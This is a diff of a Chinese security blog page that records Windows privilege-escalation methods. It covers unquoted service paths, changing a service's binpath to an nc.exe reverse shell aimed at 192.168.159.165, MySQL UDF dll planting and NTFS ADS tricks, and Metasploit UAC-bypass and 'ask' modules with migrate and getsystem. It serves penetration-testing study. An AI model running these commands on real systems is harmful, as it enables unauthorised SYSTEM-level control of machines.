@@ -98,7 +98,9 @@
 <meta property="og:image" content="https://k-ring.github.io/img/windows9.jpg">
 <meta property="og:image" content="https://k-ring.github.io/img/windows10.jpg">
 <meta property="og:image" content="https://k-ring.github.io/img/windows11.jpg">
-<meta property="og:updated_time" content="2019-10-08T08:08:43.482Z">
+<meta property="og:image" content="https://k-ring.github.io/img/windows14.jpg">
+<meta property="og:image" content="https://k-ring.github.io/img/windows15.jpg">
+<meta property="og:updated_time" content="2019-10-12T01:19:58.850Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows部分提权方法复现和记录">
 <meta name="twitter:description" content="前言记录并复现提权的常用姿势，方便在以后理解并使用。     为什么要提权？因为一般我们通过web获取到的系统管理权限非常低，比如linux下的话通常就是www权限，这个权限基本限制了我们只能在web目录下执行一些有限的操作。   那么想要获取到系统更多的信息和进行更多的操作，就需要更高的权限。通常常用的两个系统高权限：Linux：root权限Windows：system权限">
@@ -378,7 +380,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  3,490 字
+                  3,817 字
                 </span>
               
 
@@ -394,7 +396,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  14 分钟
+                  15 分钟
                 </span>
               
             </div>
@@ -558,7 +560,7 @@
 <p>我这里存在三个服务是不加引号的错误配置，在<code>C:\Program File (x86)</code>这里存在空格，要使服务再次启动时调用我们的恶意程序，我们应该有一个名为Program.exe的恶意程序放在C盘根目录下，当重启服务，遇到空格时就会调用C:\Program.exe程序。     </p>
 <p>我的恶意程序代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Program.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"whoami &gt; D:\\whoami.txt"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>然后编译成<code>Program.exe</code>文件，放到C盘根目录下。    </p>
-<p>重新启动服务，此处可能由于权限低，无法重启服务，那么就只有强制重启服务器<code>shutdown -r -t 0</code>，当服务器重新开启时，就能运行我们的恶意程序。    </p>
+<p>重新启动服务，此处可能由于权限低，无法重启服务，那么就只有强制重启服务器<code>shutdown -r -t0</code>，当服务器重新开启时，就能运行我们的恶意程序。    </p>
 <p><img src="https://k-ring.github.io/img/windows13.jpg" alt>    </p>
 <p>成功获取到system权限。    </p>
 <h4 id="需要条件"><a href="#需要条件" class="headerlink" title="需要条件"></a>需要条件</h4><ul>
@@ -587,10 +589,8 @@
 <p><code>VSS</code>服务能成功启动，所以这里我选择使用<code>VSS</code>服务。     </p>
 <p>使用<code>sc qc VSS</code>命令查看该服务信息：<br><img src="https://k-ring.github.io/img/windows7.jpg" alt>   </p>
 <p>在<code>BINARY_PATH_NAME</code>参数的内容<code>C:\Windows\system32\vssvc.exe</code>就是当VSS服务启动时系统调用的命令，<code>SERVICE_START_NAME</code>参数内容就是该服务运行时的权限。<br>我们要做的就是将前一个参数内容植入我们的payload(此处payload为nc调用cmd反弹shell的命令)，后一个参数改为系统权限LocalSystem。     </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc config VSS binpath= &quot;C:\windows\temp\nc.exe -nv 192.168.159.165 9999 -e C:\windows\system32\cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">sc qc VSS</span><br><span class="line"></span><br><span class="line">sc config VSS obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://k-ring.github.io/img/windows8.jpg" alt>   </p>
-<p><strong>图片中第二个红色框框里面有问题，还差一个监听的端口，当时改了之后忘了更换截图，上面的命令以成功更改。正确的内容应该为<code>C:\windows\temp\nc.exe -nv 192.168.159.165 9999 -e C:\windows\system32\cmd.exe</code></strong></p>
-<p>(我之前已经复现过，所以这里第二个参数已经被我改了，不用纠结我还没有设置运行权限就已经是LocalSystem，如果设置过程中发现没有权限可以换一个其他服务)    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc config VSS binpath= &quot;C:\windows\temp\nc.exe -nv 192.168.159.165 -e C:\windows\system32\cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">sc qc VSS</span><br><span class="line"></span><br><span class="line">sc config VSS obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://k-ring.github.io/img/windows8.jpg" alt><br>(我之前已经复现过，所以这里第二个参数已经被我改了，不用纠结我还没有设置运行权限就已经是LocalSystem，如果设置过程中发现没有权限可以换一个其他服务)    </p>
 <p>启动内容和启动权限设置好了，通过<code>sc qc VSS</code>查看该服务内容是否被成功修改。     </p>
 <p>如果修改成功，后面只需启动服务即可反弹一个system权限的shell：    </p>
 <p>首先在本地监听一个端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvvp 9999</span><br></pre></td></tr></table></figure></p>
@@ -616,18 +616,37 @@
 <h4 id="通过注入生成udf-dll文件"><a href="#通过注入生成udf-dll文件" class="headerlink" title="通过注入生成udf.dll文件"></a>通过注入生成udf.dll文件</h4><p>1、首先查看mysql数据库版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version;</span><br></pre></td></tr></table></figure></p>
 <p>2、查看是否有导入导出权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;secure_file_priv&apos;;</span><br></pre></td></tr></table></figure></p>
 <p>查看是否为空(只有为空才有任意导入导出权限)     </p>
-<p>3、可以直接将函数内容导出到指定位置的dll文件中   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select to_base64(load_file(&apos;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&apos;)) into dumpfile &apos;/tmp/udf.b64&apos;;</span><br><span class="line"></span><br><span class="line">select from_base64(&quot;&lt;base64_data&gt;&quot;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure>
+<p>3、可以直接将函数内容导出到指定位置的dll文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select to_base64(load_file(&apos;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&apos;)) into dumpfile &apos;/tmp/udf.b64&apos;;</span><br><span class="line"></span><br><span class="line">select from_base64(&quot;&lt;base64_data&gt;&quot;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></p>
 <p><code>to_base64</code>和<code>from_base64</code>在mysql5.6以上版本提供。     </p>
 <p>也可以先将该文件的二进制数据编码为十六进制，然后再解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&apos;D:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll&apos;));</span><br><span class="line"></span><br><span class="line">select unhex(data) into dumpfile &apos;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&apos;;</span><br></pre></td></tr></table></figure></p>
-<p>4、默认情况plugin目录不存在<br>利用NTFS ADS流来创建文件夹:    </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line"></span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;D:\\phpStudy\\PHPTutorial\\MySQL\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line"></span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;D:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+<p>4、默认情况plugin目录不存在<br>利用NTFS ADS流来创建文件夹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line"></span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;D:\\phpStudy\\PHPTutorial\\MySQL\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line"></span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;D:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure></p>
 <h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/h4ck0ne/p/5154604.html" target="_blank" rel="noopener">MYSQL提权总结</a><br><a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">利用MySQL UDF进行的一次渗透测试</a>   </p>
+<h3 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h3><p>在msf里面获取到一个低权限的shell后，使用绕过uac进行提权   </p>
+<p><a href="https://baike.baidu.com/item/%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%8E%A7%E5%88%B6/8084230?fromtitle=uac&amp;fromid=895573&amp;fr=aladdin" target="_blank" rel="noopener">百度百科：什么是UAC？</a>    </p>
+<p>粗俗理解：UAC是对用户权限控制的功能，绕过UAC相当于绕过权限验证   </p>
+<p>具体权限提升如何实现暂时不深究。   </p>
+<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>1、在msf中有一个低权限的meterpreter会话<br><img src="https://k-ring.github.io/img/windows14.jpg" alt>   </p>
+<p>2、将meterpreter会话放到后台运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; bg</span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;background</span><br></pre></td></tr></table></figure></p>
+<p>3、加载绕过UAC提权模块   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/windows/local/bypassuac</span><br><span class="line">&gt; set session 23</span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://k-ring.github.io/img/windows15.jpg" alt>   </p>
+<p>提权成功的话会返回一个meterpreter会话，但是使用getuid还是低权限用户   </p>
+<p>使用<code>ps</code>查看进程中是否存在SYSTEM权限运行的进程   </p>
+<p>存在这样一个进程   </p>
+<p>4、迁移进程<br>使用<code>migrate</code>命令将进程迁移到SYSTEM权限运行的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 8604</span><br></pre></td></tr></table></figure></p>
+<p>或者可以直接使用命令<code>getsystem</code>提升权限   </p>
+<p>5、再使用<code>getuid</code>查看权限，成为了SYSTEM权限    </p>
+<h3 id="提高程序运行级别（runas）"><a href="#提高程序运行级别（runas）" class="headerlink" title="提高程序运行级别（runas）"></a>提高程序运行级别（runas）</h3><p>以高权限重启一个返回式的shellcode，但是没有绕过UAC，会触发用户的UAC，只有当用户点击<code>是</code>之后才会返回一个高权限shell   </p>
+<h4 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>利用方式和前面相似，只是用的模块不一样<br>前面部分操作省略。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/windows/local/ask</span><br><span class="line">&gt; set session 23</span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p><strong>等待用户点击确认后会返回一个meterpreter会话</strong>   </p>
+<p>使用命令 <code>getsystem</code> 提升权限。    </p>
+<h2 id="寻找其他的一系列ms漏洞提权"><a href="#寻找其他的一系列ms漏洞提权" class="headerlink" title="寻找其他的一系列ms漏洞提权"></a>寻找其他的一系列ms漏洞提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/windows/local/ms[tab]</span><br></pre></td></tr></table></figure>
 <h2 id="其他提权方式"><a href="#其他提权方式" class="headerlink" title="其他提权方式"></a>其他提权方式</h2><p>参考文末的文章</p>
 <h2 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
 <li><a href="https://xz.aliyun.com/t/2519#toc-16" target="_blank" rel="noopener">Windows提权笔记</a>   </li>
 <li><a href="https://www.freebuf.com/news/141335.html" target="_blank" rel="noopener">攻击者侵入系统后如何提升账户权限：提权技术详细分析</a>  </li>
 <li><a href="https://www.t00ls.net/articles-49501.html" target="_blank" rel="noopener">Windows下命令行下载文件总结</a></li>
+<li><a href="https://www.cnblogs.com/wh4am1/p/6602650.html" target="_blank" rel="noopener">metasploit下Windows下多种提权方式</a></li>
 </ul>
 <h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>因为对计算机底层实现服务的原理不是很清楚，接触起来也比较吃力，导致很多由服务提权的方式都没有成功复现，不知道从何下手，暂时就先复现这部分，待以后技艺增长再行复现。     </p>
 
@@ -800,7 +819,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows提权命令记录"><span class="nav-number">2.</span> <span class="nav-text">Windows提权命令记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地提权exp"><span class="nav-number">3.</span> <span class="nav-text">本地提权exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过系统服务提权"><span class="nav-number">4.</span> <span class="nav-text">通过系统服务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不带引号的服务路径"><span class="nav-number">4.1.</span> <span class="nav-text">不带引号的服务路径</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.1.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#需要条件"><span class="nav-number">4.1.2.</span> <span class="nav-text">需要条件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不安全的服务权限"><span class="nav-number">4.2.</span> <span class="nav-text">不安全的服务权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提权原理"><span class="nav-number">4.2.1.</span> <span class="nav-text">提权原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用过程"><span class="nav-number">4.2.2.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章"><span class="nav-number">4.2.3.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用总结"><span class="nav-number">4.2.4.</span> <span class="nav-text">利用总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF提权"><span class="nav-number">4.3.</span> <span class="nav-text">UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过webshell上传文件"><span class="nav-number">4.3.1.</span> <span class="nav-text">通过webshell上传文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过注入生成udf-dll文件"><span class="nav-number">4.3.2.</span> <span class="nav-text">通过注入生成udf.dll文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章-1"><span class="nav-number">4.3.3.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他提权方式"><span class="nav-number">5.</span> <span class="nav-text">其他提权方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章-2"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结束语"><span class="nav-number">7.</span> <span class="nav-text">结束语</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows提权命令记录"><span class="nav-number">2.</span> <span class="nav-text">Windows提权命令记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地提权exp"><span class="nav-number">3.</span> <span class="nav-text">本地提权exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过系统服务提权"><span class="nav-number">4.</span> <span class="nav-text">通过系统服务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不带引号的服务路径"><span class="nav-number">4.1.</span> <span class="nav-text">不带引号的服务路径</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.1.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#需要条件"><span class="nav-number">4.1.2.</span> <span class="nav-text">需要条件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不安全的服务权限"><span class="nav-number">4.2.</span> <span class="nav-text">不安全的服务权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提权原理"><span class="nav-number">4.2.1.</span> <span class="nav-text">提权原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用过程"><span class="nav-number">4.2.2.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章"><span class="nav-number">4.2.3.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用总结"><span class="nav-number">4.2.4.</span> <span class="nav-text">利用总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF提权"><span class="nav-number">4.3.</span> <span class="nav-text">UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过webshell上传文件"><span class="nav-number">4.3.1.</span> <span class="nav-text">通过webshell上传文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过注入生成udf-dll文件"><span class="nav-number">4.3.2.</span> <span class="nav-text">通过注入生成udf.dll文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章-1"><span class="nav-number">4.3.3.</span> <span class="nav-text">参考文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过UAC提权"><span class="nav-number">4.4.</span> <span class="nav-text">绕过UAC提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用步骤"><span class="nav-number">4.4.1.</span> <span class="nav-text">利用步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提高程序运行级别（runas）"><span class="nav-number">4.5.</span> <span class="nav-text">提高程序运行级别（runas）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用步骤-1"><span class="nav-number">4.5.1.</span> <span class="nav-text">利用步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找其他的一系列ms漏洞提权"><span class="nav-number">5.</span> <span class="nav-text">寻找其他的一系列ms漏洞提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他提权方式"><span class="nav-number">6.</span> <span class="nav-text">其他提权方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章-2"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结束语"><span class="nav-number">8.</span> <span class="nav-text">结束语</span></a></li></ol></div>
             
 
           </div>
@@ -834,7 +853,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">41.4k</span>
+    <span title="Site words total count">41.7k</span>
   
 </div>
 
